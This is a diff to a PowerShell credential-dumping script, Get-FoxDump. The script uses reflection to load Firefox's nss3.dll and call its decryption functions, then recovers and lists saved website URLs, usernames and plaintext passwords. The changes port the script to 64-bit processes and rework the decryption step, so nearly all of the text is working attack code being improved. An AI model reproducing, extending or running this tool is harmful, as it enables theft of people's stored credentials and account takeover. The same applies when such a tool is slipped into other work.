@@ -1,6 +1,4 @@
-Function Get-FoxDump 
-{
-    <#
+﻿    <#
     .SYNOPSIS 
     This script will utilize the api functions within the nss3.dll to decrypt saved passwords. This will only be successfull if the masterpassword has not been set.
 
@@ -30,7 +28,8 @@ Function Get-FoxDump
         [string]$OutFile
 
     )
-    #PSREFLECT CODE
+
+    #region PSREFLECT CODE
     function New-InMemoryModule
   {
     <#
@@ -719,7 +718,7 @@ Function Get-FoxDump
 
         $StructBuilder.CreateType()
     }
-    #end of PSREFLECT CODE
+    #endregion of PSREFLECT CODE
 
     #http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
 
@@ -764,9 +763,9 @@ Function Get-FoxDump
     )
 
     $TSECItem = struct $Mod TSECItem @{
-        SECItemType    =    field 0 Int
-        SECItemData    =    field 1 Int
-        SECItemLen     =    field 2 Int
+        SECItemType    =    field 0 Int64
+        SECItemData    =    field 1 Int64
+        SECItemLen     =    field 2 Int64
     }
 
     $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
@@ -776,9 +775,12 @@ Function Get-FoxDump
 
     if([IntPtr]::Size -eq 8)
     {
-        Throw "Unable to load 32-bit dll's in 64-bit process."
+        $mozillapath = "C:\Program Files\Mozilla Firefox"
+    } else {
+        $mozillapath = "C:\Program Files (x86)\Mozilla Firefox"
     }
-    $mozillapath = "C:\Program Files (x86)\Mozilla Firefox"
+
+    
     
     If(Test-Path $mozillapath)
     {
@@ -848,16 +850,39 @@ Function Get-FoxDump
 
         #Cast the result from the Decode buffer function as a TSECItem struct and create an empty struct. Decrypt the cipher text and then
         #store it inside the empty struct.
-        $Result = $NSSBase64_DecodeBuffer.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $cipherText, $cipherText.Length)
-        Write-Verbose "[+]NSSBase64_DecodeBuffer Result: $Result"
-        $ResultPtr = $Result -as [IntPtr]
-        $offset = $ResultPtr.ToInt64()
-        $newptr = New-Object System.IntPtr -ArgumentList $offset
-        $TSECStructData = $newptr -as $TSECItem
-        $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($TSECStructData))
+        $Result = [Convert]::FromBase64String($cipherText)
+
+        #Create Empty struct
+        $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Result.Length)
         $EmptyTSECItem = $ptr -as $TSECItem
+        $EmptyTSECItem.SECItemType = 0
+        $EmptyTSECItem.SECItemData = 0
+        $EmptyTSECItem.SECItemLen = 0
+
+        $TSECStructData = $EmptyTSECItem
+
+        #Write-Verbose "[+]NSSBase64_DecodeBuffer Result: $Result"
+
+        $ResultHandle = [System.Runtime.InteropServices.GCHandle]::Alloc($Result, [System.Runtime.InteropServices.GCHandleType]::Pinned)
+        $ResultPtr = $ResultHandle.AddrOfPinnedObject()
+
+        $offset = $ResultPtr.ToInt64()
+
+        $newptr = New-Object System.IntPtr -ArgumentList $offset
+
+        $TSECStructData.SECItemType = 0
+        $TSECStructData.SECItemData = $newptr
+        $TSECStructData.SECItemLen = $Result.Length
+
+
         $result = $PK11SDR_Decrypt.Invoke([ref]$TSECStructData, [ref]$EmptyTSECItem, 0)
+
+
         Write-Verbose "[+]PK11SDR_Decrypt result:$result"
+
+        $ResultHandle.Free()
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr)
+
         if($result -eq 0)
         {
 
@@ -878,10 +903,6 @@ Function Get-FoxDump
     $NSSInitAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSS_Init")
     $NSSInitDelegates = Get-DelegateType @([string]) ([long])
     $NSS_Init = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSInitAddr, $NSSInitDelegates)
-
-    $NSSBase64_DecodeBufferAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSSBase64_DecodeBuffer")
-    $NSSBase64_DecodeBufferDelegates = Get-DelegateType @([IntPtr], [IntPtr], [string], [int]) ([int])
-    $NSSBase64_DecodeBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSBase64_DecodeBufferAddr, $NSSBase64_DecodeBufferDelegates)
 
     $PK11SDR_DecryptAddr = $Kernel32::GetProcAddress($nssdllhandle, "PK11SDR_Decrypt")
     $PK11SDR_DecryptDelegates = Get-DelegateType @([Type]$TSECItem.MakeByRefType(),[Type]$TSECItem.MakeByRefType(), [int]) ([int])
@@ -945,16 +966,13 @@ Function Get-FoxDump
             $passwordlist | Format-List URL, UserName, Password | Out-String
         }
 
-        $kernel32::FreeLibrary($msvcp120dllHandle) | Out-Null
-        $Kernel32::FreeLibrary($msvcr120dllHandle) | Out-Null
-        $kernel32::FreeLibrary($mozgluedllHandle) | Out-Null
-        $kernel32::FreeLibrary($nssdllhandle) | Out-Null
-      
+        if ($msvcr120dllHandle -ne $null) { $kernel32::FreeLibrary($msvcp120dllHandle) | Out-Null }
+        if ($msvcr120dllHandle -ne $null) { $kernel32::FreeLibrary($msvcr120dllHandle) | Out-Null }
+        if ($mozgluedllHandle -ne $null) { $kernel32::FreeLibrary($mozgluedllHandle) | Out-Null }
+        if ($nssdllhandle -ne $null) { $kernel32::FreeLibrary($nssdllhandle) | Out-Null }
     }
     else
     {
         Write-Warning "Unable to locate default profile"
     }
     
-
-}
